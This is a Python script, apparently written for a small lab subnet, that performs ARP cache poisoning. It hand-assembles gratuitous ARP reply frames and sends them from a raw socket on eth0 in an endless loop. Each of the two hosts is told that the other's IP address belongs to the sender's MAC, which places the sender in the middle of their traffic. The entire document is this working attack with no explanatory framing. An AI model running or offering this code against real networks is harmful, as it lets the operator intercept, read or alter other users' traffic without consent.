from dataclasses import dataclass
import socket
import time

def ip_bin(ip_str: str) -> bytes:
    return bytes(map(int, ip_str.split(".")))

def mac_bin(mac_str: str) -> bytes:
    return bytes.fromhex(mac_str.replace(":", ""))

@dataclass
class Spoof:
    spoofed_ip: bytes
    target_ip: bytes
    target_mac: bytes

our_ip = ip_bin("198.7.0.3")
our_mac = mac_bin("02:42:c6:0a:00:02")

targets = [
    Spoof(
        spoofed_ip=ip_bin("198.7.0.1"),
        target_ip=ip_bin("198.7.0.2"),
        target_mac=mac_bin("02:42:c6:0a:00:03"),
    ),
    Spoof(
        spoofed_ip=ip_bin("198.7.0.2"),
        target_ip=ip_bin("198.7.0.1"),
        target_mac=mac_bin("02:42:c6:0a:00:01"),
    )
]

def assemble_frame(spoof: Spoof) -> bytes:
    buf = bytearray()
    buf += spoof.target_mac  # Destination MAC
    buf += our_mac # Source MAC
    buf += b"\x08\x06"  # ARP EtherType
    buf += b"\x00\x01"  # Ethernet HTYPE
    buf += b"\x08\x00"  # IPv4 PTYPE
    buf += b"\x06"  # MAC size
    buf += b"\x04"  # IP size
    buf += b"\x00\x02"  # ARP reply (gratuitous ARP)
    buf += our_mac # Source MAC
    buf += spoof.spoofed_ip # Source IP
    buf += b"\x00\x00\x00\x00\x00\x00"  # Target MAC
    buf += spoof.target_ip # Target IP
    return bytes(buf)

ETH_P_ALL = 0x0003
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, int(socket.htons(ETH_P_ALL)))

while True:
    for target in targets:
        sock.sendto(assemble_frame(target), ("eth0", 0))
    time.sleep(1)
